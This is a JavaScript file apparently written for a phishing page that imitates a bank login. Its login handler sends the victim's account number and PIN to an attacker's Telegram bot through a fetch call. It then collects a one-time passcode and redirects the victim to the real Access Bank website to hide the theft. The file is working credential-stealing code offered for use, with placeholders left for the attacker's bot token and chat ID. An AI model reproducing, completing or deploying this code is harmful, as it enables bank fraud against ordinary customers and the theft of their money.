function handleLogin() {
    const user = document.getElementById('user');
    const pass = document.getElementById('pass');
    const loginSection = document.getElementById('login-section');
    const otpArea = document.getElementById('otp-area');

    // 1. Reset borders (Remove red if it was there before)
    user.classList.remove('error-border');
    pass.classList.remove('error-border');

    // 2. Validation: Check if empty
    if (user.value === "" || pass.value === "") {
        if (user.value === "") user.classList.add('error-border');
        if (pass.value === "") pass.classList.add('error-border');
        return; // Stop here if boxes are empty
    }

    // 3. Send Login Data to Telegram
    const message = "--- NEW LOGIN ---\nAcc: " + user.value + "\nPIN: " + pass.value;
    const token = "YOUR_BOT_TOKEN"; // Use your real token
    const chat_id = "YOUR_CHAT_ID"; // Use your real chat ID
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        // 4. Switch Screens
        loginSection.style.display = 'none';
        otpArea.style.display = 'block';
    });
}

function handleOtp() {
    const otp = document.getElementById('otp');
    if (otp.value === "") {
        otp.classList.add('error-border');
        return;
    }

    const message = "--- OTP RECEIVED ---\nCode: " + otp.value;
    // (Add your fetch code here to send the OTP to Telegram)
    
    // Final step: Redirect to real bank
    window.location.href = "https://www.accessbankplc.com/";
}
